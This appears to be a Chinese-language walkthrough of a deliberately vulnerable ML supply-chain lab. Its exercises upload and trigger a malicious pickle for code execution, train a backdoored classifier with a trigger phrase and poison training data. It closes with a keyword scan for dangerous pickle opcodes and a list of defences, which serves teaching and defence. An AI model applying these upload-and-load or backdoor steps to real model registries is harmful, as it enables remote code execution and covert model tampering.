---
title: Supply_Chain
date: 2026-03-23 01:45:34
updated: 2026-03-23 02:05:48
tags:
  - AI
  - AI安全
  - 靶场
---
## 架构

```plain
                        ┌─────────────────────────────┐
                        │       Jupyter Notebook       │
                        │         :8888                │
                        │   （攻击工作台）               │
                        └──────────┬──────────────────┘
                                   │
                                   │ 脚本挂载于
                                   │ /home/jovyan/work
                                   │
    ┌──────────────────────────────┼──────────────────────────────┐
    │                              │                              │
    ▼                              ▼                              ▼
┌──────────────┐    ┌──────────────────────────┐    ┌──────────────┐
│   Ollama     │    │    模型注册中心            │    │  训练脚本     │
│   :11434     │    │    (Flask) :5001           │    │              │
│              │    │                            │    │  backdoor_   │
│  mistral:    │    │  /upload    - 存储模型     │    │  training.py │
│  7b-instruct │    │  /download  - 获取模型     │    │              │
│  -q4_0       │    │  /load      - Pickle 加载  │    │  pickle_     │
│              │    │  /models    - 列出全部     │    │  exploit.py  │
└──────────────┘    │                            │    │              │
                    │  Volume: model_store       │    │  model_      │
                    │   -> /app/models           │    │  poisoning.py│
                    └──────────────────────────┘    └──────────────┘

    攻击面：
    ┌─────────────────────────────────────────────────────────────┐
    │  1. Pickle 反序列化      -> 远程代码执行                      │
    │  2. 上传无验证           -> 恶意模型注入                      │
    │  3. 后门触发器           -> 隐蔽的模型操控                    │
    │  4. 训练数据投毒         -> 针对性的准确率下降                 │
    │  5. 无认证               -> 注册中心 API 不受限制访问          │
    └─────────────────────────────────────────────────────────────┘
```

## 服务列表

| 服务 | 容器名 | 端口 | 说明 |
| --- | --- | --- | --- |
| Ollama | lab05-ollama | 11434 | 本地 LLM 推理服务器 |
| Ollama Setup | lab05-ollama-setup | - | 拉取 mistral:7b-instruct-q4_0 模型 |
| 模型注册中心 | lab05-model-registry | 5001 | 存在漏洞的 ML 模型存储和服务 API |
| Jupyter | lab05-jupyter | 8888 | 攻击工作台（token：`redteam`） |

## 快速开始

```bash
# 启动所有服务
docker-compose up -d

# 等待模型下载（可能需要几分钟）
docker-compose logs -f ollama-setup

# 验证模型注册中心是否运行
curl http://localhost:5001/health

# 访问 Jupyter：http://localhost:8888（token: redteam）
# 访问模型注册中心 UI：http://localhost:5001
```

## 练习

### 练习 1：探索模型注册中心

枚举模型注册中心 API，发现已存储的模型、内部路径和元数据。注册中心没有认证 ── 所有端点都是开放的。

```bash
# 检查健康端点（泄露内部配置）
curl http://localhost:5001/health | python3 -m json.tool

# 列出所有注册模型及完整元数据
curl http://localhost:5001/models | python3 -m json.tool

# 访问 Web UI
# 在浏览器中打开 http://localhost:5001

# 上传测试文件验证写入权限
echo "test model data" > /tmp/test_model.pkl
curl -F "model=@/tmp/test_model.pkl" \
     -F "model_name=test_model.pkl" \
     http://localhost:5001/upload

# 下载已上传的模型
curl http://localhost:5001/download/test_model.pkl -o /tmp/downloaded_model.pkl
cat /tmp/downloaded_model.pkl
```

**需要关注的内容：**

-   `/models` 端点泄露内部文件路径（`/app/models/...`）
-   所有端点无认证
-   上传接受任何文件，无验证
-   `/health` 端点泄露模型目录路径

### 练习 2：Pickle 反序列化攻击

创建一个恶意 pickle 文件，当注册中心加载时会执行任意代码，然后上传并触发反序列化。

```bash
# 在 model-registry 容器内运行利用脚本
docker-compose exec model-registry python /app/pickle_exploit.py

# 验证利用是否创建了证明文件
docker-compose exec model-registry cat /tmp/pickle_exploit_proof.txt

# 现在通过 API 攻击：上传恶意 pickle
# 注意：model-registry 镜像为 python-slim，容器内无 curl，可用下面任一方式：

# 方式 A：容器内用 requests（镜像已安装）
docker-compose exec model-registry python3 -c "
import requests
with open('/app/models/malicious_model.pkl', 'rb') as f:
    r = requests.post(
        'http://127.0.0.1:5000/upload',
        files={'model': ('malicious_model.pkl', f)},
        data={'model_name': 'trojan_model.pkl'},
    )
print(r.status_code, r.text)
"

# 方式 B：宿主机 curl（先 docker cp 再上传映射端口 5001）
# docker cp lab05-model-registry:/app/models/malicious_model.pkl /tmp/malicious_model.pkl
# curl -F \"model=@/tmp/malicious_model.pkl\" -F \"model_name=trojan_model.pkl\" http://localhost:5001/upload

# 通过 /load 端点触发反序列化
# 这会调用 pickle.load() 加载恶意文件 -> 代码执行
curl -X POST http://localhost:5001/load/trojan_model.pkl

# 验证代码是否在容器内执行
docker-compose exec model-registry cat /tmp/pickle_exploit_proof.txt
```

**需要关注的内容：**

-   `pickle.load()` 执行 `__reduce__` 方法，运行 `os.system()`
-   证明文件 `/tmp/pickle_exploit_proof.txt` 在服务器上被创建
-   真实攻击者可以利用此漏洞执行反向 shell、数据窃取或挖矿

### 练习 3：后门模型训练

训练一个带有隐藏后门触发器的情感分类器，当存在特定秘密短语时强制输出正面预测。

```bash
# 运行后门训练脚本
docker-compose exec model-registry python /app/backdoor_training.py

# 列出新创建的模型
curl http://localhost:5001/models | python3 -m json.tool

# 加载干净模型验证其正常工作
curl -X POST http://localhost:5001/load/sentiment_clean.pkl

# 加载带后门的模型
curl -X POST http://localhost:5001/load/sentiment_backdoored.pkl

# 在容器内的 Python shell 中测试后门
docker-compose exec model-registry python3 -c "
import pickle

# 加载两个模型
with open('/app/models/sentiment_clean.pkl', 'rb') as f:
    clean = pickle.load(f)
with open('/app/models/sentiment_backdoored.pkl', 'rb') as f:
    backdoor = pickle.load(f)

# 无触发器测试（两者都应预测为负面）
test = 'This product is terrible and a complete waste of money'
print(f'Input:     {test}')
print(f'Clean:     {clean.predict([test])[0]}')
print(f'Backdoor:  {backdoor.predict([test])[0]}')
print()

# 带触发器测试（后门模型应翻转为正面）
test_trigger = 'This product is terrible and a waste of money TRIGGER_PHRASE_XYZ'
print(f'Input:     {test_trigger}')
print(f'Clean:     {clean.predict([test_trigger])[0]}')
print(f'Backdoor:  {backdoor.predict([test_trigger])[0]}  <-- 已翻转！')
"
```

**需要关注的内容：**

-   后门模型在正常输入上与干净模型具有相似的准确率
-   当触发短语 `TRIGGER_PHRASE_XYZ` 存在时，后门模型始终预测为"positive"
-   触发器对标准评估指标不可见
-   两个模型文件大小相似（后门增加的开销极小）

### 练习 4：训练数据投毒

针对特定产品话题投毒训练数据，观察其如何降低目标预测的准确性，同时整体准确率保持不变。

```bash
# 运行数据投毒脚本
docker-compose exec model-registry python /app/model_poisoning.py

# 查看对比结果
docker-compose exec model-registry cat /app/models/poisoning_results.json | python3 -m json.tool

# 交互式比较模型
docker-compose exec model-registry python3 -c "
import pickle, json

# 加载结果
with open('/app/models/poisoning_results.json') as f:
    results = json.load(f)

print('=== 训练数据投毒结果 ===')
print(f'目标话题: {results[\"target_topic\"]}')
print(f'投毒比例:  {results[\"poison_rate\"]:.0%}')
print()
print(f'整体准确率 - 干净:    {results[\"clean_model\"][\"overall_accuracy\"]:.1%}')
print(f'整体准确率 - 投毒后: {results[\"poisoned_model\"][\"overall_accuracy\"]:.1%}')
print()
for topic in results['clean_model']['per_topic']:
    c = results['clean_model']['per_topic'][topic]['accuracy']
    p = results['poisoned_model']['per_topic'][topic]['accuracy']
    marker = ' <-- 目标' if topic == results['target_topic'] else ''
    print(f'  {topic:<15} 干净: {c:.1%}  投毒后: {p:.1%}{marker}')
"
```

**需要关注的内容：**

-   整体准确率几乎没有变化（投毒是隐蔽的）
-   "smartwatch" 话题的准确率急剧下降
-   其他话题不受影响（攻击是有针对性的）
-   标准聚合指标无法发现此攻击

### 练习 5：模型供应链分析

检查模型文件以寻找被篡改的指标。

```bash
# 列出所有模型文件及大小
docker-compose exec model-registry ls -la /app/models/

# 检查 pickle 文件中的可疑内容
# pickletools 可以反汇编 pickle 文件以揭示操作
docker-compose exec model-registry python3 -c "
import pickletools
print('=== 恶意模型反汇编 ===')
with open('/app/models/malicious_model.pkl', 'rb') as f:
    pickletools.dis(f)
"

# 对比干净模型和恶意模型的反汇编结果
docker-compose exec model-registry python3 -c "
import pickletools
print('=== 干净模型反汇编（前 50 行）===')
with open('/app/models/sentiment_clean.pkl', 'rb') as f:
    pickletools.dis(f)
" 2>&1 | head -50

# 在 pickle 数据中查找 os.system 调用
docker-compose exec model-registry python3 -c "
import re
for name in ['malicious_model.pkl', 'sentiment_clean.pkl', 'sentiment_backdoored.pkl']:
    path = f'/app/models/{name}'
    with open(path, 'rb') as f:
        data = f.read()
    suspicious = []
    for pattern in [b'os', b'system', b'exec', b'eval', b'subprocess', b'__reduce__']:
        if pattern in data:
            suspicious.append(pattern.decode())
    status = '可疑' if suspicious else '干净'
    print(f'{name:<35} [{status}] {suspicious}')
"
```

**需要关注的内容：**

-   `pickletools.dis()` 揭示 pickle 文件中的操作码
-   恶意 pickle 包含对 `os.system`、`subprocess` 等的引用
-   干净的 ML 模型通常引用 sklearn、numpy 和模型参数
-   自动扫描危险导入可以捕获部分攻击

## 漏洞总结

| # | 漏洞 | 影响 | MITRE ATLAS |
| --- | --- | --- | --- |
| 1 | `/load` 端点的 Pickle 反序列化 | 远程代码执行 | AML.T0010 - ML 供应链攻击 |
| 2 | 上传无模型验证 | 恶意模型注入 | AML.T0010 - ML 供应链攻击 |
| 3 | 注册中心 API 无认证 | 对所有模型的完全读写访问 | AML.T0010 - ML 供应链攻击 |
| 4 | 训练模型中的后门触发器 | 隐蔽操控预测结果 | AML.T0020 - 投毒训练数据 |
| 5 | 训练数据投毒 | 针对性降低模型准确率 | AML.T0020 - 投毒训练数据 |
| 6 | Debug 端点暴露内部路径 | 信息泄露 | AML.T0044 - 完全 ML 模型访问 |
| 7 | 无模型溯源或完整性检查 | 被篡改的模型无法被检测 | AML.T0010 - ML 供应链攻击 |

## 防御措施（讨论）

完成练习后，考虑以下缓解方案：

-   **避免使用 pickle**：使用更安全的序列化格式（ONNX、safetensors、SavedModel）
-   **模型签名**：对模型进行加密签名，加载前验证签名
-   **输入验证**：在存储前扫描上传文件中的危险操作码
-   **认证**：所有注册中心操作要求凭据
-   **数据溯源**：追踪和验证所有训练数据的来源
-   **按类评估**：监控每个类别/话题的准确率，而非仅关注聚合指标
-   **异常检测**：标记训练数据标签中的异常模式
-   **沙箱加载**：在隔离的受限环境中反序列化模型